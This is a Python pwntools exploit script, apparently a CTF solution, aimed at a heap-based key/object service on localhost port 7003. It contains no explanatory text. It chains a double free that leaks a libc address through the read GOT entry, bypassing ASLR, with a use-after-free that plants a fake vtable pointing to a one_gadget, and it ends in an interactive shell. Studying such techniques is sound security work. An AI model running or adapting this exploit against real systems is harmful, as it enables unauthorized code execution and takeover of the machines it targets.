from pwn import *

# 12 -> 16 -> 32

libc_base = 0
one_gadget_offset =  0xe6e79 #0xe6e76 #0xe6e73
read_got = 0x000000000606370 - 16 # minus header
read_offset = 0x0000000000111130

create_key = b"c"
assign_key = b"a"
search_key = b"s"
create_object = b"o"
delete_object = b"D"
use_object = b"u"

base = b"b"
derived1 = b"1"
derived2 = b"2"

host = "localhost"
port = 7003

key_double_free = b"z"
key_double_free2 = b"y"
key_double_free3 = b"k"
key_double_free4 = b"j"
key0 = b"0"
key0b = b"1"
key1 = b"a"
key2 = b"b"

with remote(host,port) as conn:

    # double free to defeat aslr 
    payload = create_object + key_double_free + base + b"10"
    conn.send(payload)
    conn.recvline()

    payload = delete_object + key_double_free
    payload += delete_object + key_double_free
    payload += create_key + key_double_free2 + b"16"
    conn.send(payload)
    conn.recvline()

    payload = assign_key + key_double_free2 + p64(read_got) * 2
    payload += create_key + key_double_free3 + b"16"
    conn.send(payload)
    conn.recvline()

    payload = create_key + key_double_free4 + b"16"
    conn.send(payload)
    conn.recvline()

    payload = search_key + key_double_free4
    conn.send(payload)
    chunk_content = conn.recv(16)
    read_address = u64(chunk_content[0:8])
    libc_base = read_address - read_offset
    print("libc base: {}".format(hex(libc_base)))


input("collega gdb")

with remote(host,port) as conn:

    # create a chunk containing a fake vtable, first function pointing to shellcode
    payload = create_key + key0b + b"16"
    conn.send(payload)
    fake_vtable_address = int(conn.recvline()[:-1], 16)
    print("Fake vtable {}".format(hex(fake_vtable_address)))
    payload = assign_key + key0b + p64(libc_base + one_gadget_offset) * 2
    conn.send(payload)

    # exploit use after free
    payload = create_object + key1 + base + b"10"
    payload += delete_object + key1
    payload += create_key + key2 + b"16"
    payload += assign_key + key2 + p64(fake_vtable_address) * 2
    payload += use_object + key1
    conn.send(payload)

    conn.interactive()